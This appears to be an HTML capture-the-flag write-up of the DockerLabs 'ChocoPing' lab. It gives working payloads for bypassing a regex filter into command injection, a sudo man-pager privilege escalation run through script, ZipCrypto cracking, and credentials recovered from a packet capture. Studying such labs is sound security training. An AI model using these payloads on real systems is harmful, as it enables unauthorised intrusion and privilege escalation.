@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 73 ChocoPing &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; ChocoPing</p><h1 id="73-chocoping--dockerlabs-writeup">73 ChocoPing — DockerLabs Writeup</h1>
+<p><strong>Class:</strong> a regex gate that treats an <em>obfuscation token</em> as a bypass admission ticket and then hands the same variable to an unescaped <code>shell_exec</code>, chained through a <code>man</code>-pager sudoers grant to a second user, a ZipCrypto-cracked archive, and credential recovery from a packet capture.</p>
+<p><strong>Target:</strong> <code>http://[net-0-8]/ping.php?ip=…</code> (container <code>chocoping_container</code>, image <code>chocoping</code>)
+<strong>Date:</strong> 2026-10-01
+<strong>Outcome:</strong> Full advertised chain solved — WAF bypass RCE as <code>uid=33(www-data)</code>, sudoers escalation to <code>uid=1000(balutin)</code>, ZipCrypto archive cracked, packet capture analysed. <strong>No flag token exists in the image</strong> (§6). <strong>Every write into the target was backed out and verified absent with <code>stat -c</code>; the docroot checksum is unchanged.</strong></p>
+<p><strong>Headline:</strong> the filter is not a wall, it is a <strong>turnstile that opens when you show it a costume</strong>. And the bypass branch hides its own success behind a deliberately broken first command, so the response a careless operator reads first is always empty.</p>
+<hr />
+<h2 id="0-lab-identity">0. Lab identity</h2>
+<p>The platform catalogue entry for 73, quoted verbatim from <code>[lab-home]/dockerlabs/catalog.txt:61</code>:</p>
+<pre><code>73|ChocoPing|medio|Ejecuci\u00f3n remota de comandos con WAF Bypass, cracking .zip, sudoers y an\u00e1lisis de archivo .pcap
+</code></pre>
+<p>The file stores non-ASCII as JSON-style <code>\uXXXX</code> escapes; the decoded reading of the description field is <em>&quot;Ejecución remota de comandos con WAF Bypass, cracking .zip, sudoers y análisis de archivo .pcap&quot;</em>. Difficulty <code>medio</code>.</p>
+<p><strong>Correction to the task brief.</strong> The brief described this lab as <em>&quot;WAF bypass class&quot;</em> and asked for a privesc tail &quot;if there is one&quot;. The catalogue says otherwise: it advertises <strong>four</strong> elements — WAF bypass, <code>.zip</code> cracking, sudoers, and <code>.pcap</code> analysis. Those four map onto four distinct mechanisms, and all four are reachable. Had I stopped at &quot;no privesc&quot; on the strength of the brief's framing, I would have filed a false negative on three of the four advertised elements. <strong>§0 of a lab writeup is where a paraphrase of the brief gets caught.</strong></p>
+<h3 id="stack-from-version-bearing-artefacts">Stack, from version-bearing artefacts</h3>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web server</td>
+<td>Apache/2.4.62 (Debian)</td>
+<td><code>Server:</code> header on <code>GET /</code></td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>8.2.28, <code>mod_php</code>, <code>mpm_prefork</code></td>
+<td><code>php -v</code>, <code>mods-enabled/php8.2.load</code></td>
+</tr>
+<tr>
+<td>Directory index</td>
+<td><code>autoindex</code> <strong>enabled</strong></td>
+<td><code>/etc/apache2/mods-enabled/autoindex.load</code></td>
+</tr>
+<tr>
+<td><code>disable_functions</code></td>
+<td><strong>empty</strong></td>
+<td><code>/etc/php/8.2/apache2/php.ini:323</code></td>
+</tr>
+<tr>
+<td><code>display_errors</code> / <code>log_errors</code></td>
+<td><code>Off</code> / <code>On</code></td>
+<td><code>php.ini:508</code>, <code>php.ini:527</code></td>
+</tr>
+<tr>
+<td>Execution identity</td>
+<td><code>www-data</code> uid 33, shell <code>/usr/sbin/nologin</code></td>
+<td><code>ps aux</code>, <code>/etc/passwd</code></td>
+</tr>
+<tr>
+<td>Second user</td>
+<td><code>balutin</code> uid 1000, groups <code>1000(balutin),100(users)</code></td>
+<td><code>/etc/passwd</code>, <code>id</code> via RCE</td>
+</tr>
+<tr>
+<td><code>ping</code></td>
+<td><code>/usr/bin/ping</code>, 90568 bytes, <code>cap_net_raw=ep</code></td>
+<td><code>command -v</code>, <code>getcap -r /</code></td>
+</tr>
+<tr>
+<td>Tooling present</td>
+<td><code>script</code> (util-linux 2.38.1), <code>perl</code>, <code>unzip</code>, <code>zip</code></td>
+<td><code>command -v</code> loop</td>
+</tr>
+<tr>
+<td>Tooling absent</td>
+<td><code>ss</code>, <code>netstat</code>, <code>python3</code>, <code>socat</code>, <code>7z</code>, <code>john</code>, <code>hashcat</code>, <code>tshark</code></td>
+<td><code>command -v</code> loop</td>
+</tr>
+</tbody>
+</table>
+<p><code>disable_functions</code> being empty is load-bearing: it is why <code>shell_exec</code> at <code>ping.php:22</code> genuinely executes rather than silently returning <code>null</code>.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<p>Re-measured, not assumed. <code>ss</code> and <code>netstat</code> are <strong>not installed in this image</strong>, so all three listener views come from <code>/proc</code>:</p>
+<pre><code>$ cat /proc/net/tcp            # 1 data row after the header
+  00000000:0050  00000000:0000  0A   ← 0A = TCP_LISTEN, 0x0050 = 80
+
+$ cat /proc/net/tcp6           # header only — zero rows
+$ cat /proc/net/udp            # header only — zero rows
+</code></pre>
+<p>Exactly <strong>one</strong> listener, <code>0.0.0.0:80</code>. No SSH, no other TCP, no IPv6, and <strong>no UDP socket of any kind</strong>. That is the entire network surface, and it matches the baseline given in the brief.</p>
+<p><strong>That negative is earned, not assumed.</strong> A <code>/proc/net/*</code> listing is a claim about what the kernel has bound; it is not a statement about what is reachable. The client-side control is that the <em>same</em> curl invocation reached <code>:80</code> successfully on 65 requests (§ work count, <code>evidence/work_count.txt</code>), and <code>curl</code> reached <code>robots.txt</code> with an Apache <code>404</code> and <code>/</code> with an Apache <code>200</code> — so the client path worked. The single-row listener table is therefore a measurement, not a gap.</p>
+<p>Docroot, read directly:</p>
+<pre><code>$ ls -la /var/www/html/
+-rw-r--r-- 1 root root 1011 Apr  5  2025 ping.php      ← the only file
+</code></pre>
+<p><strong><code>autoindex</code> is on</strong>, so the docroot enumerates itself without a wordlist:</p>
+<pre><code>$ GET http://[net-0-8]/          → 200, 749 bytes, Apache index listing, one entry: ping.php
+$ GET http://[net-0-8]/robots.txt → 404, 272 bytes (Apache default error body, no rules)
+</code></pre>
+<p>No <code>robots.txt</code> exists, so the <code>ctf-safe-enumeration</code> rule set has nothing to honour: no <code>Disallow</code>, no <code>Crawl-delay</code>, no <code>Sitemap</code>. That is itself a measured negative — a <code>404</code> from the origin root, distinguished from a <code>200</code> with an empty body by the 272-byte Apache error page.</p>
+<p>Total HTTP requests issued against the target: <strong>65</strong>, itemised in <code>evidence/work_count.txt</code>.</p>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<blockquote>
+<p>A deny-list gate whose <strong>escape hatch is a bypass detector</strong>. The author anticipated command injection, decided to <em>permit</em> a specific obfuscated shape rather than block it, and then wired the permitted input into a sink with no escaping at all.</p>
+</blockquote>
+<p>The source, <code>/var/www/html/ping.php</code>, 32 lines, read from the container (<code>evidence/src_ping_php.txt</code>):</p>
+<pre><code class="language-php"> 3: $ip = $_GET['ip'];
+ 5: function is_bypass_command($input) {
+ 6:     return preg_match('/[a-zA-Z]+\\\\/', $input);
+ 7: }
+ 9: if (isset($ip)) {
+10:     if (!preg_match('/[;&amp;|`]/', $ip)) {
+11:         $ping_result = shell_exec(&quot;ping -c 4 &quot; . escapeshellarg($ip));
+12:         echo &quot;&lt;pre&gt;$ping_result&lt;/pre&gt;&quot;;
+13:     }
+15:     else if (preg_match('/[;&amp;|`]/', $ip) &amp;&amp; is_bypass_command($ip)) {
+17:         $ping_result = shell_exec(&quot;ping -c 4 &quot; . escapeshellarg($ip));
+18:         echo &quot;&lt;pre&gt;$ping_result&lt;/pre&gt;&quot;;
+22:         $result = shell_exec($ip);
+23:         echo &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;;
+24:     } else {
+26:         die(&quot;Comando no permitido.&quot;);
+27:     }
+</code></pre>
+<p>Three things a generic WAF chapter does not teach:</p>
+<p><strong>1. The gate is a two-condition AND, and the second condition is an admission ticket.</strong> Line 10 rejects any of <code>[;&amp;|</code>]<code>. Line 15 re-admits input that carries a metachar **and** matches </code>is_bypass_command<code>. PHP single-quoting collapses </code>'/[a-zA-Z]+\\/'<code>to the PCRE</code>[a-zA-Z]+\<code>: one or more letters followed by one literal backslash. That is not a blocklist — it is an **allowlist of obfuscation shapes**. Any string containing </code>x` satisfies it. The source comment at lines 20–21 states the intent outright: <em>&quot;Como el comando contiene un bypass (w\h\o\a\m\i), lo permitimos&quot;</em>. The author built the keyhole and posted the shape of the key in a comment.</p>
+<p><strong>2. One variable, two sinks, two different escaping disciplines.</strong> Line 17 wraps <code>$ip</code> in <code>escapeshellarg</code>; line 22 does not. The same variable is simultaneously a safely-quoted argument and a bare command string. The security property of the page is decided by which line you read, and the page prints <em>both</em> results in <em>both</em> branches.</p>
+<p><strong>3. The bypass branch is camouflaged by its own first command.</strong> This is the part that costs an operator their finding. In the bypass branch, line 17 runs <code>ping -c 4 'w\h\o\a\m\i;id'</code> — the whole payload becomes one single-quoted hostname, <code>ping</code> fails, and <strong>its error goes to stderr, which <code>shell_exec</code> does not collect</strong>. The response body therefore opens with an empty <code>&lt;pre&gt;&lt;/pre&gt;</code>. An operator who reads the first <code>&lt;pre&gt;</code> concludes the payload did nothing. The proof is always in the <em>second</em> block.</p>
+<p>The decoy is independently corroborated outside the response body. The target's own error log records every one of my bypass attempts as a failed <code>ping</code>:</p>
+<pre><code>$ tail /var/log/apache2/error.log
+ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
+ping: w\h\o\a\m\i;id: Name or service not known
+</code></pre>
+<p>Same request, two channels, opposite-looking stories: the HTTP body says &quot;nothing ran&quot;, the error log says &quot;line 17 ran and failed, and here is its exact argument&quot;. <strong>Neither channel alone is sufficient.</strong></p>
+<hr />
+<h2 id="3-attack-chain">3. Attack chain</h2>
+<pre><code>Internet ──:80──► Apache 2.4.62 + mod_php 8.2  DocumentRoot /var/www/html
+                     │  autoindex on → docroot enumerates itself
+                     ▼
+        GET /ping.php?ip=&lt;payload&gt;                ping.php:3, :9
+                     │
+    ┌────────────────┴─────────────────┐
+    │                                  │
+ :10 no metachar                  :15 metachar AND [a-zA-Z]+\\
+    │                                  │
+ :11 escapeshellarg              :17 escapeshellarg  ← DECOY, always fails,
+    │                             :22 shell_exec($ip)   its stderr is dropped
+    ▼                                  ▼
+ ping 127.0.0.1 (works)         w\h\o\a\m\i;id
+ 230 B, 3.09 s                   │
+                            uid=33(www-data) RCE
+                                 │
+                    sudo -n -l → (balutin) NOPASSWD: /usr/bin/man
+                                 │   man needs a TTY to run its pager
+                    script -qec &quot;sudo -u balutin man -P /tmp/run.sh ls&quot;
+                                 ▼
+                    uid=1000(balutin) RCE
+                                 │
+                    [lab-home]/balutin/secretito.zip  (mode 644, dir 700)
+                                 │   base64 → /tmp → HTTP response body
+                                 ▼
+                    ZipCrypto, password 'chocolate' (candidate 22574)
+                                 ▼
+                    traffic.pcap  (375 B)
+                                 ▼
+        username=root&amp;password=secretitosecretazo!
+        Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE= → root:SuperSecret123!
+</code></pre>
+<h3 id="hop-1--the-filter-is-alive-and-ping-is-installed">Hop 1 — the filter is alive, and <code>ping</code> is installed</h3>
+<p>The brief warned that <code>ping</code> might be absent, which would make branch one a dead sink and change what a <code>200</code> means. Checked before relying on it:</p>
+<pre><code>$ command -v ping → /usr/bin/ping   (90568 bytes, -rwxr-xr-x)
+</code></pre>
+<p>And the branch demonstrably executes:</p>
+<pre><code>GET /ping.php?ip=127.0.0.1 → 200, 230 bytes, 3.09 s
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+  … 4 packets transmitted, 4 received, 0% packet loss, time 3089ms
+</code></pre>
+<p><strong>Discriminating evidence:</strong> the 3.09 s wall-clock time and four <code>icmp_seq</code> lines. A <code>200</code> with an empty body would not carry that. <strong>The brief's hypothesis is falsified: branch one is a live sink, and a <code>200</code> on this page does imply work happened</strong> — for this parameter, on this path.</p>
+<h3 id="hop-2--negative-a-metachar-without-the-ticket-is-refused">Hop 2 — negative A: metachar without the ticket is refused</h3>
+<pre><code>GET /ping.php?ip=%3Bid          → 200, 21 bytes
+  Comando no permitido.
+</code></pre>
+<p>This is the <code>die()</code> at <code>ping.php:26</code>. It is a <code>200</code>, so <strong>status code alone proves nothing</strong> — the discriminator is the 21-byte body carrying the refusal string. Control: the same client, one request earlier, returned 230 bytes of real <code>ping</code> output, so the page was alive and the body channel was working.</p>
+<h3 id="hop-3--negative-b-ticket-without-a-metachar-never-reaches-the-gate">Hop 3 — negative B: ticket without a metachar never reaches the gate</h3>
+<pre><code>GET /ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci   → 200, 11 bytes
+  &lt;pre&gt;&lt;/pre&gt;
+</code></pre>
+<p>This one is routinely misread, so it is worth being exact. <code>w\h\o\a\m\i</code> carries <strong>no</strong> metacharacter, so line 10's <code>!preg_match('/[;&amp;|</code>]/')<code>is **true** and the request takes branch one.</code>is_bypass_command<code>is never evaluated — the</code>&amp;&amp;<code>on line 15 is not reached. So this payload is **not rejected**; it is *never asked*. It is quoted into</code>ping -c 4 'w\h\o\a\m\i'<code>, that hostname does not resolve, the error goes to stderr, and </code>echo &quot;<pre></pre>&quot;` prints the empty block.</p>
+<p>This is why Hop 5 needs a control: <strong>the ticket alone gets you nothing, and the metachar alone gets you nothing, and the empty <code>&lt;pre&gt;&lt;/pre&gt;</code> looks identical in both cases.</strong> Between Hop 3 and Hop 5 the body is byte-for-byte the same shape (11 vs 22 bytes, both <code>&lt;pre&gt;&lt;/pre&gt;</code>), which is exactly the trap.</p>
+<h3 id="hop-4--the-combined-payload-reaches-the-unescaped-sink">Hop 4 — the combined payload reaches the unescaped sink</h3>
+<pre><code>GET /ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Bid   → 200, 63 bytes
+  &lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;www-data
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  &lt;/pre&gt;
+</code></pre>
+<p><strong>Discriminating evidence, three independent channels:</strong></p>
+<ul>
+<li>the second <code>&lt;pre&gt;</code> contains <code>uid=33(www-data)</code>, which is not producible by any <code>ping</code> output;</li>
+<li>the execution identity is <code>www-data</code>, <strong>not</strong> <code>root</code> — the container's <code>docker exec</code> shell is root (<code>/etc/passwd</code>, <code>ps aux</code> PID 1), so had the sink run as root the body would have said <code>uid=0(root)</code>. Getting <code>uid=33</code> proves the identity came from the <em>web</em> path, not from my own harness;</li>
+<li><code>/var/log/apache2/error.log</code> gained <code>ping: w\h\o\a\m\i;id: Name or service not known</code>, confirming line 17 executed and failed while line 22 succeeded.</li>
+</ul>
+<p>The shell collapses <code>w\h\o\a\m\i</code> to <code>whoami</code> and then runs <code>id</code> after the <code>;</code>. That is the whole trick: the token is not a payload, it is a <strong>no-op prefix</strong> whose only function is to satisfy <code>preg_match</code> on line 6.</p>
+<h3 id="hop-5--known-positive-control-a-nonce-i-can-read-back-out-of-band">Hop 5 — known-positive control: a nonce I can read back out of band</h3>
+<p><code>id</code> proves a command ran. It does not prove <em>my</em> command ran in <em>this</em> session, on <em>this</em> request. So a marker:</p>
+<pre><code>GET …ip=w\h\o\a\m\i;touch /tmp/[tool]-marker-73-CHOCOPING73-4bccb96faa6a   → 200, 31 bytes
+$ docker exec … stat -c '%n %s bytes mode=%a uid=%u' /tmp/[tool]-marker-73-CHOCOPING73-4bccb96faa6a
+  /tmp/[tool]-marker-73-CHOCOPING73-4bccb96faa6a 0 bytes mode=644 uid=33     ← OOB, created
+GET …ip=w\h\o\a\m\i;cat /tmp/[tool]-marker-73-CHOCOPING73-4bccb96faa6a     → 200, 56 bytes
+  &lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;www-data
+  CHOCOPING73-4bccb96faa6a
+  &lt;/pre&gt;                                                                     ← nonce in the body
+</code></pre>
+<p>The nonce <code>CHOCOPING73-4bccb96faa6a</code> exists nowhere in the target or in <code>ping.php</code>. It appears in the HTTP response body, and <code>stat -c</code> confirms the file's owner is <code>uid=33</code>. Write and read-back both proven, in band and out of band. <strong>First attempt at this control failed and is written up as I1 — the nonce was silently empty.</strong></p>
+<h3 id="hop-6--metacharacter-sweep-one-variable-at-a-time">Hop 6 — metacharacter sweep, one variable at a time</h3>
+<p>Backslash pattern held constant at <code>w\h\o\a\m\i</code>; only the metacharacter varied (<code>evidence/sweep.txt</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Bytes</th>
+<th>Body</th>
+<th>What actually happened</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>w\h\o\a\m\i;id</code></td>
+<td>63</td>
+<td><code>www-data</code> + <code>uid=33…</code></td>
+<td><code>whoami</code> then <code>id</code> — separated</td>
+</tr>
+<tr>
+<td><code>w\h\o\a\m\i|id</code></td>
+<td>60</td>
+<td><code>uid=33…</code> only</td>
+<td><code>whoami | id</code> — <strong>piped</strong>, so <code>whoami</code>'s output became <code>id</code>'s stdin and vanished</td>
+</tr>
+<tr>
+<td><code>w\h\o\a\m\i&amp;id</code></td>
+<td>63</td>
+<td><code>www-data</code> + <code>uid=33…</code></td>
+<td><code>whoami &amp; id</code> — backgrounded, both outputs</td>
+</tr>
+<tr>
+<td><code>w\h\o\a\m\i\</code>id``</td>
+<td>22</td>
+<td><code>&lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;&lt;/pre&gt;</code></td>
+<td><strong>empty</strong> — see below</td>
+</tr>
+<tr>
+<td><code>whoami;id</code></td>
+<td>21</td>
+<td><code>Comando no permitido.</code></td>
+<td>no backslash → no ticket → refused</td>
+</tr>
+</tbody>
+</table>
+<p>The <code>|</code> row is a free confirmation of the shell-collapse claim: <code>www-data</code> disappears <strong>only</strong> when the token's output is piped somewhere, which is only possible if the token really did become the command <code>whoami</code>.</p>
+<p>The backtick row is the interesting one and it is initially a <strong>false negative</strong>. Empty body, no execution evidence. Per discipline I refused to trust it and built a control (<code>evidence/control.txt</code>):</p>
+<pre><code>GET …ip=w\h\o\a\m\i`id`                 → 200, 22 bytes, &lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;&lt;/pre&gt;   (repeat, identical)
+GET …ip=w\h\o\a\m\i`touch /tmp/bt-marker-73` → 200, 31 bytes, www-data
+$ stat -c '%n %s bytes uid=%u' /tmp/bt-marker-73
+  /tmp/bt-marker-73 0 bytes uid=33                                            ← IT RAN
+</code></pre>
+<p>So the backtick form <strong>does</strong> execute; only its output is invisible. The reason is the token's own position: backticks perform <em>substitution</em>, not <em>separation</em>, so the shell concatenates. <code>whoami</code> + output-of-<code>id</code> (<code>uid=33(www-data)…</code>) forms a single nonsense command name → <em>command not found</em> on stderr → empty stdout. Where the backtick's inner command produces <strong>no</strong> stdout (<code>touch</code>), the concatenation collapses back to exactly <code>whoami</code> and prints normally. Both observations are explained by one rule, and the marker file settles it.</p>
+<p><strong>This is the writeup's sharpest lesson.</strong> <code>w\h\o\a\m\i\</code>id`<code>returns an empty body that is indistinguishable from the refusal at</code>ping.php:26`. Had I filed on the body, I would have reported &quot;backticks are filtered&quot; — a claim about the filter's coverage that is false, backed by a real response.</p>
+<h3 id="hop-7--the-sudoers-grant">Hop 7 — the sudoers grant</h3>
+<p>Measured <strong>as <code>www-data</code> through the sink</strong>, not as root. This matters: every piece of recon I ran via <code>docker exec</code> was root, and a root-run privesc survey would have answered a question nobody asked.</p>
+<pre><code>$ sudo -n -l    (as www-data, via RCE)
+User www-data may run the following commands on 0f38876b0aa7:
+    (balutin) NOPASSWD: /usr/bin/man
+</code></pre>
+<p>One rule, and it is <strong>binary-specific</strong>. Proven by three same-shape probes, not assumed:</p>
+<pre><code>sudo -u balutin /usr/bin/man --version   → rc=0, &quot;man 2.11.2&quot;
+sudo -u balutin /usr/bin/id              → rc=1, &quot;sudo: a password is required&quot;
+sudo -u balutin /usr/bin/env             → rc=1, &quot;sudo: a password is required&quot;
+</code></pre>
+<h3 id="hop-8--code-execution-as-balutin-man-will-not-page-without-a-tty">Hop 8 — code execution as <code>balutin</code>: <code>man</code> will not page without a TTY</h3>
+<p>The classic <code>man</code> escalation is <code>MANPAGER</code>/<code>-P</code>. Both were measured, both dead ends — and one of them nearly became a false finding (I2, I3):</p>
+<pre><code>sudo -u balutin MANPAGER=&quot;…&quot; /usr/bin/man ls   → rc=1
+  sudo: sorry, you are not allowed to set the following environment variables: MANPAGER
+$ ls -la /tmp/bal.txt → No such file or directory          ← OOB control, marker absent
+</code></pre>
+<p><code>MANPAGER</code> is rejected outright because <code>sudoers</code> grants no <code>SETENV</code> and <code>env_reset</code> applies. And <code>-P</code>, which is plain <code>argv</code> and therefore <em>not</em> stripped by <code>sudo</code>, does nothing without a terminal:</p>
+<pre><code>sudo -u balutin /usr/bin/man -P /tmp/p.sh ls → rc=0, man page printed, /tmp/pwned.txt absent
+</code></pre>
+<p><strong>Root cause:</strong> <code>man-db</code> only invokes a pager when <code>stdout</code> is a tty. Through <code>shell_exec</code> stdout is always a pipe, so <code>-P</code> is accepted, recorded, and never used. <code>/usr/bin/man</code> 2.11.2 also honours no shell escape — a crafted page containing <code>'e id</code> rendered as <strong>literal text</strong> <code>&quot;e id</code> in the output, with no execution (a controlled negative, <code>evidence/privesc_writable.txt</code>).</p>
+<p>The missing ingredient is a pty, and the image ships one: <code>script</code> from util-linux 2.38.1.</p>
+<pre><code>$ printf '#!/bin/sh\nid &gt; /tmp/pwned.txt\n' &gt; /tmp/p.sh &amp;&amp; chmod 755 /tmp/p.sh
+$ script -qec &quot;sudo -u balutin /usr/bin/man -P /tmp/p.sh ls&quot; /dev/null
+$ cat /tmp/pwned.txt
+  uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)      ← OOB proof
+</code></pre>
+<p><code>sudoers</code> allows <code>/usr/bin/man</code> with <strong>any argv</strong>, and <code>-P</code> is argv. Wrapping the call in <code>script</code> supplies the tty that <code>man-db</code> requires, so <code>man</code> dutifully runs <code>/tmp/p.sh</code> as <code>balutin</code>. Note the HTTP response body for this request was <strong>effectively empty</strong> — the escalation is visible only in the marker file. A repeatable helper was then built around it, with the execution identity echoed explicitly (<code>EUID=1000 USER=balutin</code>) so that no run's identity had to be inferred.</p>
+<h3 id="hop-9--the-archive">Hop 9 — the archive</h3>
+<p><code>[lab-home]/balutin/</code> is <code>drwx------ balutin</code>, and <code>[lab-home]/balutin/secretito.zip</code> is unreadable to <code>www-data</code> (measured: <code>Permission denied</code>). As <code>balutin</code>:</p>
+<pre><code>$ unzip -l secretito.zip        →  traffic.pcap, 375 bytes, &quot;file security status: encrypted&quot;
+</code></pre>
+<p>Copied to <code>/tmp</code> with mode 644 and exfiltrated as base64 through the RCE response body (<code>evidence/zip_b64_raw.txt</code>), then analysed on the host. Cipher identification before any cracking:</p>
+<pre><code>flag_bits = 0x0009   → bit0 encrypted, bit3 data descriptor, bit6 (AES) CLEAR
+compress_type = 8 (deflate), compressed 293 → uncompressed 375, CRC32 0x04a65ee4
+</code></pre>
+<p>No strong-encryption bit means <strong>legacy ZipCrypto</strong>, which is crackable. No cracking tool was installed, so one was written (<code>evidence/zipcrypto_crack.py</code>) and — this is the part that matters — <strong>validated against a known-answer control before being allowed to produce a negative</strong> (I4, I5).</p>
+<h3 id="hop-10--cracking-with-the-instrument-under-test">Hop 10 — cracking, with the instrument under test</h3>
+<pre><code>wordlist: sorted-passwords.txt (101,074 candidates)
+CRACKED after 22,574 candidates → 'chocolate'
+traffic.pcap  375 bytes  sha256 e98d75f0ea4ee7a5b3a980bf4f6ea440706d91d8f1641615411550bd97a4ce8c
+</code></pre>
+<p>Candidates were accepted on a full inflate plus CRC32 comparison against <code>0x04a65ee4</code>, not on <code>unzip</code>'s exit status — a wrong password makes <code>unzip</code> print <code>incorrect password</code>, which is also what it prints for a right password against the wrong file.</p>
+<h3 id="hop-11--packet-capture-analysis">Hop 11 — packet capture analysis</h3>
+<p>375 bytes, <code>pcap capture file, microsecond ts (little-endian) - version 2.4 (Raw IPv4)</code>. Two packets, both plaintext HTTP, no <code>tshark</code> needed:</p>
+<pre><code>POST /login HTTP/1.1
+Host: ejemplo.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=root&amp;password=secretitosecretazo!
+
+GET /private HTTP/1.1
+Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
+Host: ejemplo.com
+</code></pre>
+<p>Two credential pairs, one cleartext in a form body and one base64 in a header. Base64 is encoding, not encryption:</p>
+<pre><code>$ echo cm9vdDpTdXBlclNlY3JldDEyMyE= | base64 -d
+root:SuperSecret123!
+</code></pre>
+<p>Both credentials were then tested against the only authentication consumer that exists here, <code>su</code>, and <strong>both failed</strong> (<code>su: Authentication failure</code>, each with a 10 s <code>timeout</code>). The capture's host is <code>ejemplo.com</code>, which does not resolve to anything in this container. So these credentials are the <em>narrative payload</em> of the lab — evidence that a plaintext credential crossed the wire — and not a usable local login. Recorded as a negative with its control in <code>evidence/privesc_success.txt</code>.</p>
+<hr />
+<h2 id="4-findings">4. Findings</h2>
+<h3 id="reachability">Reachability</h3>
+<p><strong>R1 — Unauthenticated remote command execution as <code>www-data</code>.</strong> A single GET parameter on a single unauthenticated page reaches an unescaped <code>shell_exec</code>. No session, no token, no parameter other than <code>ip</code> is consulted. Confirmed by marker write with OOB <code>stat -c</code> (uid 33) and by nonce read-back into the response body.</p>
+<p><strong>R2 — The docroot enumerates itself.</strong> <code>autoindex</code> enabled; <code>GET /</code> lists <code>ping.php</code> with size and mtime. No wordlist was used at any point in this engagement.</p>
+<p><strong>R3 — The bypass branch executes attacker input twice, once deliberately broken.</strong> Line 17 and line 22 both receive <code>$ip</code>; the first is <code>escapeshellarg</code>'d and guaranteed to fail, the second is not escaped at all.</p>
+<h3 id="disclosed">Disclosed</h3>
+<p><strong>D1 — Server and interpreter versions.</strong> <code>Apache/2.4.62 (Debian)</code> in the <code>Server:</code> header; PHP 8.2.28 via <code>php -v</code>; <code>disable_functions</code> empty at <code>php.ini:323</code>. The empty <code>disable_functions</code> is what makes R1 a real execution sink rather than a <code>null</code>-returning no-op.</p>
+<p><strong>D2 — Directory structure and one non-root account.</strong> Docroot listing plus <code>/etc/passwd</code>, which discloses <code>balutin</code> uid 1000 — the account the sudoers rule names. The privesc target was therefore identifiable from the RCE without any further guessing.</p>
+<h3 id="decisive">Decisive</h3>
+<p><strong>D1 — Unescaped <code>shell_exec</code> at <code>ping.php:22</code>, reachable via the admission ticket at <code>ping.php:6</code>.</strong> The mechanism is derived, not asserted: PHP single-quoting turns <code>'/[a-zA-Z]+\\\\/'</code> into the PCRE <code>[a-zA-Z]+\\</code>, which matches any letters-followed-by-backslash; the shell then collapses <code>w\h\o\a\m\i</code> to <code>whoami</code>. Confirmed by control B (ticket, no metachar → never reaches the gate), control A (metachar, no ticket → <code>die()</code>), and the conjunction (both → <code>uid=33</code> in the body).</p>
+<p><strong>D2 — <code>sudoers</code> grants <code>(balutin) NOPASSWD: /usr/bin/man</code> to <code>www-data</code>, and <code>man-db</code> 2.11.2's pager is attacker-controlled when a tty is available.</strong> The escalation is not the usual <code>MANPAGER</code> env route — that is measurably closed (<code>sudo</code> refuses <code>SETENV</code>, no <code>SETENV</code> in the rule, OOB marker absent). It is the <code>argv</code>-based <code>-P</code> route plus a pty from <code>script</code>. Proof is the marker file owned by uid 1000.</p>
+<p><strong>D3 — A credential-encrypted archive and a plaintext-credential capture.</strong> <code>secretito.zip</code> protects <code>traffic.pcap</code> with ZipCrypto (cracked, <code>chocolate</code>), and the capture carries <code>root:secretitosecretazo!</code> in a form body plus <code>root:SuperSecret123!</code> in a <code>Basic</code> header. The lab teaches the <em>pairing</em>: a weak archive cipher guarding a capture whose whole lesson is that these two secrets should never have been transmitted in the clear.</p>
+<hr />
+<h2 id="5-instrument-failures">5. Instrument failures</h2>
+<p>Every entry is a place where <strong>my own instrument</strong> lied, counted wrong, or handed me a clean negative it had not earned.</p>
+<h3 id="i1--my-positive-control-ran-with-an-empty-nonce-and-i-nearly-filed-writes-are-not-permitted">I1 — My positive control ran with an empty nonce, and I nearly filed &quot;writes are not permitted&quot;</h3>
+<p><strong>Defect.</strong> The marker request was built by a heredoc-generated script in which <code>\$NONCE</code> was escaped such that the variable was never expanded at script runtime. The payload that actually reached the target was <code>w\h\o\a\m\i;touch /tmp/[tool]-marker-73-</code> — with an <strong>empty</strong> nonce suffix.</p>
+<p><strong>What it looked like.</strong> <code>HTTP=200 BYTES=31</code>, body <code>&lt;pre&gt;&lt;/pre&gt;&lt;pre&gt;www-data</code>, followed by out-of-band <code>stat: cannot statx '/tmp/[tool]-marker-73-CHOCOPING73-4bccb96faa6a': No such file or directory</code>. That is the exact shape of a <strong>target-side write refusal</strong>: command ran, file not created, marker absent.</p>
+<p><strong>What it would have caused me to file.</strong> &quot;The sink executes, but filesystem writes to <code>/tmp</code> are not permitted from the web identity&quot; — a fabricated finding, complete with a genuine-looking <code>200</code> and a genuine-looking <code>stat</code> failure. It would also have destroyed the control's purpose, since the nonce is what distinguishes <em>my</em> write from anyone else's.</p>
